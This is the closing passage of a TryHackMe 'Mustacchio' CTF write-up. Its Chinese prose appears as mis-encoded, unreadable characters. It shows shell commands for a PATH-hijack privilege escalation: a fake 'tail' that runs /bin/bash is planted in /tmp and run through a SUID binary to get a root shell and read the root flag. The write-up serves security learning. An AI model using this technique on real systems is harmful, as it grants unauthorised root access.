translated">æˆ‘å¯ä»¥çœ‹åˆ°ä¸ºæ–‡ä»¶è®¾ç½®äº†<strong class="jp ir"> SUIDä½</strong>,å¹¶ä¸”å®ƒä½¿ç”¨äº†<strong class="jp ir">å°¾</strong>äºŒè¿›åˆ¶ï¼Œä½†æ²¡æœ‰æŒ‡å®šå®Œæ•´è·¯å¾„ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„äºŒè¿›åˆ¶æ–‡ä»¶å¹¶ç¼–è¾‘$PATHç¯å¢ƒå˜é‡æ¥ç”Ÿæˆä¸€ä¸ªæ ¹shellã€‚æˆ‘å‘ç°ä»¥ä¸‹èµ„æºæœ‰åŠ©äºäº†è§£åˆ©ç”¨æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯:</p><div class="nq nr gp gr ns nt"><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" rel="noopener  ugc nofollow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">ä½¿ç”¨è·¯å¾„å˜é‡æå‡Linuxæƒé™</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">åœ¨è§£å†³äº†å‡ ä¸ªOSCPæŒ‘æˆ˜ä¹‹åï¼Œæˆ‘ä»¬å†³å®šå†™ä¸€ç¯‡å…³äºç”¨äºLinuxçš„å„ç§æ–¹æ³•çš„æ–‡ç« â€¦</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">www.hackingarticles.in</p></div></div><div class="oc l"><div class="ol l oe of og oc oh ks nt"/></div></div></a></div><p id="5305" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†ç”Ÿæˆä¸€ä¸ªæ ¹shellï¼Œæˆ‘åœ¨<em class="kl"> /tmp </em>æ–‡ä»¶å¤¹ä¸­åˆ›å»ºäº†ä¸€ä¸ªåä¸º<strong class="jp ir"> tailã€</strong>çš„æ–‡ä»¶ï¼Œå½“æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶å°†ç”Ÿæˆä¸€ä¸ªshellã€‚ç„¶åï¼Œæˆ‘ç¼–è¾‘$PATHå˜é‡ï¼ŒæŒ‡å‘æˆ‘åˆ›å»ºæ–‡ä»¶çš„ä½ç½®ã€‚ä¸€æ—¦æˆ‘å®Œæˆäº†è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘å†æ¬¡æ‰§è¡Œäº†<strong class="jp ir"> live_log </strong> ELFäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™äº§ç”Ÿäº†ä¸€ä¸ªæ ¹shell:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="cca5" class="nd lc iq mz b gy ne nf l ng nh">barry@mustacchio:~$ echo $PATH<br/>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br/>barry@mustacchio:~$ cd /tmp<br/>barry@mustacchio:/tmp$ echo "/bin/bash" &gt; tail<br/>barry@mustacchio:/tmp$ chmod 777 tail<br/>barry@mustacchio:/tmp$ export PATH=/tmp:$PATH<br/>barry@mustacchio:/tmp$ cd /home/joe/<br/>barry@mustacchio:/home/joe$ ./live_log <br/>root@mustacchio:/home/joe#</span></pre><p id="fdf7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ€åï¼Œæˆ‘å¯ä»¥æ‹¿åˆ°æ ¹æ——å¹¶å®ŒæˆæŒ‘æˆ˜ã€‚</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c4bf" class="nd lc iq mz b gy ne nf l ng nh">root@mustacchio:/home/joe# cat /root/root.txt<br/>3223581420d9.........</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="7bc4" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç»“æŸè¯­</h1><p id="12c7" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æˆ‘çœŸçš„å¾ˆå–œæ¬¢åœ¨è¿™å°æœºå™¨ä¸Šå·¥ä½œï¼Œå¹¶ä¸”æœ‰æœºä¼šå­¦ä¹ æ›´å¤šå…³äºXMLæ³¨å…¥æ”»å‡»çš„çŸ¥è¯†ã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘ä¸‹å»ğŸ˜„ï¼</p><div class="nq nr gp gr ns nt"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">ç½‘ç»œå®‰å…¨åŸ¹è®­</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">TryHackMeæ˜¯ä¸€ä¸ªå…è´¹çš„å­¦ä¹ ç½‘ç»œå®‰å…¨çš„åœ¨çº¿å¹³å°ï¼Œä½¿ç”¨åŠ¨æ‰‹ç»ƒä¹ å’Œå®éªŒå®¤ï¼Œé€šè¿‡æ‚¨çš„â€¦</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">tryhackme.com</p></div></div><div class="oc l"><div class="om l oe of og oc oh ks nt"/></div></div></a></div></div></div>    
</body>
</html>